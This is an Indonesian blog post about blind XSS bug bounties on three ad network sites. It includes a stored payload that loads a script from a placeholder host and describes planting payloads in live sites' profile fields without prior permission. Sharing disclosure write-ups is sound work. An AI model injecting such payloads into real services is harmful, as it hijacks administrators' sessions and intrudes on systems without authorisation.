@@ -1,0 +1,61 @@
+I"©<p><img src="/images/ad_network.png" alt="Image of Ad Networks" /></p>
+
+<p>Karena kehidupan yang semakin sulit, banyaknya biaya hidup yang harus dipenuhi maka saya pun mencoba untuk mencari pendapatan tambahan dari Internet <em>(curhat)</em>. Salah satu yang saya lakukan adalah mencari uang dari situs periklanan atau biasa dikenal dengan Ad Networks. Ada banyak sekali situs Ad Networks di jagat internet ini, mulai dari yang paling terkenal milik Google yaitu Google Adsense, dan situs-situs Ad Networks lainnya.</p>
+
+<p>Beberapa waktu lalu, saldo pada situ Ad Networks saya sudah mencapai batas yang dapat di-withdraw. Dan saya pun segera melakukan penarikan pada situs tersebut. Ketika mau melakukan withdraw, saya iseng mengganti nama pada profile dengan menambahkan payload XSS didalamnya. Berharap payload tersebut akan tereksekusi di panel admin dan saya bisa melihat-lihat dalemannya hehe.</p>
+
+<p>Selang beberapa waktu, benar saja payload saya tereksekusi di admin panel Ad Networks tersebut. Saya berhasil melakukan <strong>Blind XSS</strong> pada situs tersebut.</p>
+
+<p><img src="/images/b1_panel.png" alt="Image of Ad Networks Panel" /></p>
+
+<p><strong>Blind XSS</strong> merupakan salah satu jenis XSS yang cukup unik. Kita tidak bisa melihat kapan dan dimana payload akan tereksekusi, bahkan sering kali tidak tereksekusi. Maka dari itu disebut Blind, alias buta. Payload yang kita buat umumnya tereksekusi di aplikasi lain yang saling terhubung pada satu database.</p>
+
+<p>Untuk kasus yang saya temukan ini, saya memasukan payload XSS pada Member Area Ad Networks, lalu saya melakukan <strong>Wihtdrawal Request</strong> yang dimana pastinya diperlukan pengecekan secara manual oleh Admin sebelum melakukan proses <strong>Wihtdrawal</strong> yang saya minta. Maka Admin membuka halaman yang berisi <strong>Withdrawal Request</strong> pada situsnya, dan pada halaman tersebut ada <strong>Field Full Name</strong> yang sebelumnya saya isi dengan Payload XSS pada Member Area saya.</p>
+
+<p>Berikut ini contoh source code dari Field Full Name setelah saya isi payload XSS:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;td style="color:black;cursor:pointer;" userid="x" class="userid userid_x"&gt;
+  John Smith"&amp;gt;&lt;script src="https://malicious.script/"&gt;&lt;/script&gt;
+&lt;/td&gt;
+</code></pre></div></div>
+
+<p>Karena saya merupakan orang yang jujur dan baik hati. Maka saya segera melapor pada Admin situs tersebut terkait bug yang saya temukan. Tidak lupa pula menanyakan apakah ada reward yang saya dapatkan haha..</p>
+
+<p><img src="/images/b1_email.png" alt="Image of Ad Networks Email" /></p>
+
+<p>Tidak lama admin dari situs tersebut membalas email dan memberikan saya reward terkahit bug yang saya temukan. Lumayan, Withdraw nya jadi dobel hehe..</p>
+
+<p><strong>Dari bug ini saya diberi reward sebesar $250. (Alhamdulillah)</strong></p>
+
+<p>Tidak berhenti sampai disitu, saya pun mencoba hal yang sama pada situs Ad Networks yang lain. Karena situs mereka adalah situs penghasil uang, sudah pasti mereka punya uang dan mungkin mau memberi reward seperti pada situ yang awal tadi.</p>
+
+<p><img src="/images/kamen.gif" alt="Image of Kamen" /></p>
+
+<p>Pada situs berikutnya, payload XSS saya masukan pula pada field Full Name dan tereksekusi di Halaman <strong>Channel List</strong> pada panel admin. Halaman itu berisi daftar dari publisher yang ada pada situs tersebut. Walaupun pada awalnya mereka menyangkal dan tidak percaya bahwa ada bug di situs mereka, akhirnya mereka pun percaya setelah saya gunakan <strong>alert</strong> untuk memunculkan popup pada admin panel mereka XD</p>
+
+<p><img src="/images/b2_panel.png" alt="Image of Ad Networks Panel" /></p>
+
+<p><strong>Dari bug ini saya diberi reward sebesar $50. (Alhamdulillah)</strong></p>
+
+<p>Yang terakhir saya menemukan bug yang sama pada situs Ad Networks asal Rusia. Kali ini payload tereksekusi di halaman Affiliates pada <strong>Field User Skype</strong>. Karena pada member Panel nya terdapat field Skype dan hanya field itu yang bisa diisi dengan payload XSS, field lainnya diproteksi sehingga tidak bisa memasukan HTML Tag.</p>
+
+<p><img src="/images/b3_panel.png" alt="Image of Ad Networks Panel" /></p>
+
+<p>Tidak seperti situs sebelumnya, admin situs ini sangat ramah dan sangat cepat tanggap. Bahkan ini merupakan <strong>Bounty Hunting</strong> tercepat yang saya alami. Proses dari mengirim report sampai diberi reward memakan waktu kurang dari 2 jam!</p>
+
+<p><img src="/images/b3_email1.png" alt="Image of Ad Networks Email" /></p>
+
+<p><img src="/images/b3_email2.png" alt="Image of Ad Networks Email" /></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>15 Aug 2018 22:23 = Reported
+15 Aug 2018 23:06 = Rewarded
+</code></pre></div></div>
+
+<p><strong>Dari bug ini saya diberi reward sebesar $100. (Alhamdulillah)</strong></p>
+
+<p>Begitulah cerita singkat saya <em>mengintip</em> admin panel ada situ Ad Networks. Semoga bisa memberi inspirasi bagi kalian semua para tukang ngintip wkwk. Mengintiplah untuk sesuatu yang baik, karena segala sesuatu yang baik akan membawa hasil yang baik pula.</p>
+
+<p>Referensi:</p>
+
+<p>https://www.acunetix.com/websitesecurity/detecting-blind-xss-vulnerabilities/</p>
+:ET
